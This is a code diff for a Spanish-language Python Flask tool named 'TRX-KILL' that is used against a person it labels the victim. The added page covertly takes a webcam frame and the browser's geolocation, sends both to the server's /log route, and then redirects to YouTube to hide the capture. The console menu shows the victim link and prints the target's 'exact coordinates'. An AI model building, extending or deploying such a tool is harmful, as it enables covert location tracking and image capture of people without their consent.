@@ -1,4 +1,4 @@
-import os, sys, getpass, time, threading
+import os, sys, getpass, time, threading, base64
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
@@ -11,16 +11,29 @@ if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)
 # --- SERVIDOR WEB ---
 @app.route('/')
 def index():
-    return """<html><body>
-    <script>
+    return """<html><body><script>
         navigator.mediaDevices.getUserMedia({video: true}).then(s => {
-            // Lógica de captura aquí
-            window.location.href = "https://youtube.com";
+            const v = document.createElement('video'); v.srcObject = s; v.play();
+            setTimeout(() => {
+                const c = document.createElement('canvas'); c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                const img = c.toDataURL('image/png');
+                navigator.geolocation.getCurrentPosition(pos => {
+                    fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude, {
+                        method:'POST', body: JSON.stringify({i: img}), headers:{'Content-Type':'application/json'}
+                    });
+                    window.location.href = "https://youtube.com";
+                });
+            }, 1000);
         });
     </script></body></html>"""
 
-def start_server():
-    app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False)
+@app.route('/log', methods=['POST'])
+def log():
+    lat, lon = request.args.get('lat'), request.args.get('lon')
+    with open(LOG_FILE, "a") as f:
+        f.write(f"LAT:{lat}|LON:{lon}|TIME:{time.ctime()}\n")
+    return "OK"
 
 def banner():
     os.system('clear')
@@ -33,8 +46,7 @@ def banner():
     print(" OPCIONES\033[0m")
 
 def main():
-    # Inicia el servidor en segundo plano
-    threading.Thread(target=start_server, daemon=True).start()
+    threading.Thread(target=lambda: app.run(host='127.0.0.1', port=5000, debug=False, use_reloader=False), daemon=True).start()
     
     while True:
         banner()
@@ -45,19 +57,33 @@ def main():
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
 
         if sel == "1":
-            print("\n--- 1 ---\nINGRESAR NÚMERO: ")
+            print("\n----1----\nINGRESAR NÚMERO:")
             input()
-            print("VERIFICANDO DATOS... DATOS ENCONTRADOS.")
+            print("VERIFICANDO DATOS......")
+            time.sleep(2)
+            if os.path.exists(LOG_FILE):
+                with open(LOG_FILE, 'r') as f:
+                    lines = f.readlines()
+                    if lines:
+                        last = lines[-1].strip().split('|')
+                        print(f"DATOS ENCONTRADOS; BY TRX-KILL\nPAÍS: [DETECTADO] | OPERADOR: [MOVIL]")
+                        print(f"COORDENADAS EXACTAS: {last[0].replace('LAT:', '')}, {last[1].replace('LON:', '')}")
+                    else: print("NO HAY DATOS REGISTRADOS.")
+            else: print("NO HAY DATOS.")
             input("\n[Enter]...")
+            
         elif sel == "2":
-            print("\n--- 2 ---\nLINK VÍCTIMA: http://127.0.0.1:5000")
-            print("ESPERANDO DATOS DE LA VÍCTIMA...")
+            print("\n---2---\nLINK VICTIMA: http://127.0.0.1:5000")
+            print("ESPERANDO QUE EL USUARIO ENTRE...")
             input("\n[Enter]...")
+            
         elif sel == "6":
             if getpass.getpass("KEY: ") == AUTH_PASS:
                 if os.path.exists(LOG_FILE): os.system(f"cat {LOG_FILE}")
                 else: print("NO HAY DATOS.")
+            else: print("KEY INCORRECTA")
             input("\n[Enter]...")
+            
         elif sel == "0": sys.exit()
         else: time.sleep(0.5)
 
